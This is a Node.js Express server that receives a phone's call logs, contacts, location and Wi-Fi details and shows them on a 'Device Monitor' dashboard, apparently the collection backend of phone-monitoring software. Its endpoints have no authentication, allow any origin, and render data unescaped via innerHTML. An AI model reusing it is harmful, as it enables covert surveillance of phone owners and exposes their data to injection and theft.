const express = require('express');
const cors = require('cors');
const app = express();

app.use(express.json({ limit: '10mb' }));
app.use(cors());

let latestData = {
    status: "Waiting for device to connect...",
    device: { model: "—", os: "—" },
    battery: 0,
    online: false,
    wifi: "—",
    location: { lat: 0, lng: 0 },
    calls: [],
    contacts: []
};

app.post('/api/report', (req, res) => {
    console.log(`📥 Data received at ${new Date().toLocaleTimeString()}`);
    latestData = { ...req.body, lastUpdated: new Date().toLocaleTimeString() };
    res.json({ success: true, message: "Data received" });
});

app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Device Monitor Dashboard</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <style>
            body { font-family: 'Inter', system-ui, sans-serif; background-color: #0f172a; color: #e2e8f0; }
            .custom-scrollbar::-webkit-scrollbar { width: 6px; }
            .custom-scrollbar::-webkit-scrollbar-track { background: #1e293b; }
            .custom-scrollbar::-webkit-scrollbar-thumb { background: #475569; border-radius: 4px; }
        </style>
    </head>
    <body class="min-h-screen p-6">
        <div class="max-w-6xl mx-auto">
            
            <div class="flex items-center justify-between mb-8">
                <div>
                    <h1 class="text-3xl font-bold text-white tracking-tight">Device Monitor</h1>
                    <p class="text-sm text-slate-400 mt-1" id="last-update">Waiting for data...</p>
                </div>
                <div class="flex items-center gap-2 px-4 py-2 bg-slate-800 rounded-full border border-slate-700 shadow-sm">
                    <span class="w-2.5 h-2.5 rounded-full bg-red-500" id="status-dot"></span>
                    <span class="text-sm font-medium text-slate-200" id="status-text">Connecting</span>
                </div>
            </div>

            <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
                <div class="bg-slate-800 p-5 rounded-2xl border border-slate-700 shadow-lg relative overflow-hidden">
                    <div class="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-1">Battery</div>
                    <div class="text-3xl font-bold text-white" id="battery">--%</div>
                </div>
                <div class="bg-slate-800 p-5 rounded-2xl border border-slate-700 shadow-lg relative overflow-hidden">
                    <div class="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-1">Network</div>
                    <div class="text-2xl font-bold text-white" id="network">--</div>
                </div>
                <div class="bg-slate-800 p-5 rounded-2xl border border-slate-700 shadow-lg relative overflow-hidden">
                    <div class="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-1">Wi-Fi SSID</div>
                    <div class="text-lg font-bold text-white truncate pr-8" id="wifi">--</div>
                </div>
                <div class="bg-slate-800 p-5 rounded-2xl border border-slate-700 shadow-lg relative overflow-hidden">
                    <div class="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-1">Device</div>
                    <div class="text-lg font-bold text-white truncate pr-8" id="model">--</div>
                    <div class="text-xs text-slate-400" id="os">--</div>
                </div>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div class="bg-slate-800 rounded-2xl border border-slate-700 shadow-lg overflow-hidden flex flex-col h-[500px]">
                    <div class="p-5 border-b border-slate-700 bg-slate-800/50">
                        <h2 class="text-lg font-bold text-white flex items-center gap-2">Recent Calls</h2>
                    </div>
                    <div class="flex-1 overflow-y-auto p-2 custom-scrollbar" id="call-list">
                        <div class="text-center text-slate-500 mt-10">Waiting for call logs...</div>
                    </div>
                </div>

                <div class="bg-slate-800 rounded-2xl border border-slate-700 shadow-lg overflow-hidden flex flex-col h-[500px]">
                    <div class="p-5 border-b border-slate-700 bg-slate-800/50">
                        <h2 class="text-lg font-bold text-white flex items-center gap-2">Contacts</h2>
                    </div>
                    <div class="flex-1 overflow-y-auto p-2 custom-scrollbar" id="contact-list">
                        <div class="text-center text-slate-500 mt-10">Waiting for contacts...</div>
                    </div>
                </div>
            </div>
        </div>

        <script>
            async function fetchData() {
                try {
                    const res = await fetch('/api/report'); // We'll fix this GET route below
                    const data = await res.json();
                    
                    if (!data.lastUpdated) return; 

                    document.getElementById('last-update').innerText = "Last sync: " + data.lastUpdated;
                    document.getElementById('status-dot').className = "w-2.5 h-2.5 rounded-full bg-emerald-500";
                    document.getElementById('status-text').innerText = "Online";

                    document.getElementById('battery').innerText = (data.battery || 0) + "%";
                    document.getElementById('network').innerText = data.online ? "🟢 Connected" : "🔴 Offline";
                    document.getElementById('wifi').innerText = data.wifi || "Not connected";
                    document.getElementById('model').innerText = data.device?.model || "Unknown";
                    document.getElementById('os').innerText = data.device?.os || "Unknown";

                    const callList = document.getElementById('call-list');
                    if (data.calls && data.calls.length > 0) {
                        callList.innerHTML = '';
                        data.calls.forEach(call => {
                            callList.innerHTML += \`
                                <div class="flex items-center justify-between p-3 mb-1 bg-slate-700/30 rounded-xl">
                                    <div class="font-semibold text-slate-200">\${call.number}</div>
                                    <div class="text-xs text-slate-400">\${call.type} (\${call.duration}s)</div>
                                </div>
                            \`;
                        });
                    }

                    const contactList = document.getElementById('contact-list');
                    if (data.contacts && data.contacts.length > 0) {
                        contactList.innerHTML = '';
                        data.contacts.forEach(contact => {
                            contactList.innerHTML += \`
                                <div class="flex items-center justify-between p-3 mb-1 bg-slate-700/30 rounded-xl">
                                    <div class="font-semibold text-slate-200">\${contact.name}</div>
                                    <div class="text-xs text-slate-400">\${contact.number}</div>
                                </div>
                            \`;
                        });
                    }
                } catch (e) {
                    console.error(e);
                }
            }
            setInterval(fetchData, 3000);
        </script>
    </body>
    </html>
    `);
});

// 🚨 IMPORTANT: We need a GET route for the dashboard to actually read the data!
app.get('/api/report', (req, res) => {
    res.json(latestData);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Dashboard running on port ${PORT}`));
